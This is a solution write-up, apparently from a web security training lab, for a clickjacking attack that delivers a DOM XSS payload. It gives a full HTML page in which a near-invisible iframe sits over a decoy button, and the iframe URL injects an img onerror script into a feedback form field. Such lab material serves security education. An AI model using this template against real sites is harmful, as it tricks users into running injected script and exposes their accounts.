# Combining clickjacking with a DOM XSS attack

## Description

So far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting "likes" on a Facebook page. However, the true potency of clickjacking is revealed when it is used as a carrier for another attack such as a DOM XSS attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack. 

## Task

This lab contains a XSS vulnerability that is triggered by a click. Construct a clickjacking attack that injects a XSS payload and fools the user into clicking the button to execute the payload. 

## Solution

```xml
<html>
<head>
  <style>
    #target_website {
      position: relative;
      width: 278px;
      height: 849px;
      opacity: 0.00000001;
      z-index: 2;
      top: -822px;
      left: -20px;
    }

    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
   <button>Just click this button!</button>
  </div>
  <iframe id="target_website" src="https://acc51f5f1e70d55d80c003e700bd003e.web-security-academy.net/feedback?name=</span><img src=x onerror='alert(1)' /><span>&email=me@evil.mail&subject=1&message=1">
  </iframe>
</body>

</html>
```